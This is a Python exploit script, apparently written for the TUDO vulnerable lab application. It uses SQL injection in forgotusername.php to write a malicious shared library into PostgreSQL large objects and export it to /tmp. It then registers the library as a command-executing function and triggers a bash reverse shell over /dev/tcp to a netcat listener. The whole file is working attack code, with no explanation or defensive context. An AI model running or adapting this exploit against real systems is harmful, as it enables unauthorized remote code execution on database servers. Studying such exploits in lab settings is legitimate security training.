# TUDO Unauthenticated RCE as postgres #1 - "UDF"
# William Moody
# December 22, 2025

import requests
import argparse
import base64
import random
import subprocess
import time

# Parse arguments
parser = argparse.ArgumentParser(description="Exploits SQLi in forgotusername.php to get RCE as postgres")
parser.add_argument("target",help="Target URL")
parser.add_argument("--lhost",help="Host to listen on",default="172.17.0.1")
parser.add_argument("--lport",help="Port to listen on",default="9999")
args = parser.parse_args()

# Sanitize target URL
if args.target[-1] == "/":
    args.target = args.target[:-1]

# Upload UDF via Large Objects (2048-byte chunks)
def sqli(query):
    requests.post(
        f"{args.target}/forgotusername.php",
        data={"username":f"';{query};--"}
    )

loid = random.randint(0, 99999)
sqli(f"SELECT lo_create({loid})")
print(f"[*] Created large object with LOID = {loid}")

with open("unintended/udf.so","rb") as f:
    udf_so = f.read()

pageno = 0
i = 0
j = 0
while j < len(udf_so):
    i = j
    j = j + min(2048, len(udf_so) - i)
    b64_chunk = base64.b64encode(udf_so[i:j]).decode()
    sqli(f"INSERT INTO pg_largeobject (loid, pageno, data) VALUES ({loid}, {pageno}, decode('{b64_chunk}', 'base64'))")
    print(f"[*] Inserted chunk #{pageno} into large object")
    pageno += 1

udf_filename = f"/tmp/udf_{loid}.so"
sqli(f"SELECT lo_export({loid}, '{udf_filename}')")
print(f"[*] Wrote UDF to file ({udf_filename})")

sqli(f"CREATE FUNCTION sys (cstring) RETURNS int AS '{udf_filename}', 'pg_exec' LANGUAGE C STRICT")
print(f"[*] Created UDF \"sys\" from file")

# Start listener
print("[*] Starting listener...")
subprocess.Popen(["nc","-nvlp", f"{args.lport}"])
time.sleep(1)

# Execute reverse shell
print(f"[*] Triggering reverse shell...")
sqli(f"SELECT sys('echo \"bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1\" | bash')")

# Keep shell open
while True:
    pass